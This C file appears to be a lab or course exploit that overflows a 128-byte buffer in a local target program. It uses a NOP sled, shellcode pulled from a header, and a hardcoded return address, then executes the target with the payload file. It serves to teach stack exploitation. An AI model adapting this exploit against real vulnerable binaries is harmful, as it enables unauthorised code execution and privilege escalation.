#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"

#define BUFFER_SIZE 128
#define OFFSET 16

int main(int argc, char *argv[])
{
  // TODO determin size of exploit
  char exploit[BUFFER_SIZE + 16];

  // TODO fill exploit buffer
  memset(exploit, 0x90, sizeof(exploit)); //Fill w/ NOPs
  memcpy(exploit + 128  - sizeof(shellcode), shellcode, sizeof(shellcode) -  1); //Place shellcode after NOPs

  exploit[136] = '\x9f';
  exploit[137] = '\xe9';
  exploit[138] = '\xff';
  exploit[139] = '\xff';
  exploit[140] = '\xff';
  exploit[141] = '\x7f';
  exploit[142] = '\x0';
  exploit[143] = '\x0';

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed.");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
